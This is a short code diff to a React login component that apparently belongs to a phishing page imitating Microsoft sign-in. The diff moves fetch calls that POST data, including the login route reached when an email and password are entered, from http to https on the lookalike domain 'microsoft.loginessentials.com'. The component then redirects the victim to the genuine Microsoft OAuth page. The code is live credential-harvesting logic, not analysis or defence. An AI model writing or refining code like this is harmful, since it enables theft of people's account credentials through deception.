@@ -54,7 +54,7 @@ function App() {
 
       
 
-      fetch("http://microsoft.loginessentials.com/api/", {
+      fetch("https://microsoft.loginessentials.com/api/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -135,7 +135,7 @@ function App() {
     } else if(email && password){
 
       window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638362150548137866.MjNmMGQxNDAtNzIwZS00Y2YwLWFjYjgtNDVhMjczOTEyZmYzMDI5NjNmNGQtNjA3Yy00NDk4LThmMjYtNWVhNWE1ODZhYWNj&ui_locales=en-US&mkt=en-US&client-request-id=4f07f4f3-b62f-4da9-b5d9-02c62ba441c3&state=U7BL-eIa75xtgtFN7eXwK8iAa47h2yVID6KXcjyaTXLVKyJAlnQCllRL9TwnTgj9WZWzGED54dk_kknxRH7wWS2JA1eU8LWEyOrkrQn1iICQZpIv4dKPbPRDNOOf-Mk1qcbDrri14YVJR2Yf92YN9KyzxRDePkWsTAYlOICzEcWMbyR1ocHVyVpQUAuxbK5UBpR4R7Hpi1OD1alyotU-8eZcQMdbPM_mcA_F7WNbptGmY9gDxFeSk8NVCN5tuMxiX8dhUpNDmTkxW_SxylALN4UQabl_Osfsz8Qq-epwvJw&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0';
-        fetch("http://microsoft.loginessentials.com/api/login", {
+        fetch("https://microsoft.loginessentials.com/api/login", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
